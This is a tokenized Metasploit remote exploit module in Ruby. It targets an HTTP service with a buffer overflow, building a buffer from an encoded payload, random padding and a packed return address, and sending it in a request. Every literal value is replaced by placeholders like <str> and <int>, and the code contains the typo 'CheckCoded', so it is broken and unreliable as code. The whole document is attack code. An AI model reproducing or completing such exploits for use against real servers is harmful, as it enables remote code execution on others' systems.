require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > - <int> , <str> = > <str> } , <str> = > { <str> = > <str> } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> } ] ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptPort . new ( <str> , [ true , <str> , <int> ] ) ] , self . class ) end def check res = send_request_cgi ( { <str> = > <str> , <str> = > <str> } ) if res and res . headers [ <str> ] == <str> return Exploit :: CheckCode :: Detected else return Exploit :: CheckCoded :: Safe end end def exploit buf = <str> buf << payload . encoded buf << rand_text_alpha ( <int> - buf . length , payload_badchars ) buf << [ target . ret ] . pack ( <str> ) buf << pattern_create ( <int> ) buf << rand_text_alpha ( <int> - buf . length , payload_badchars ) send_request_cgi ( { <str> = > <str> , <str> = > <str> buf <str> } ) end end 
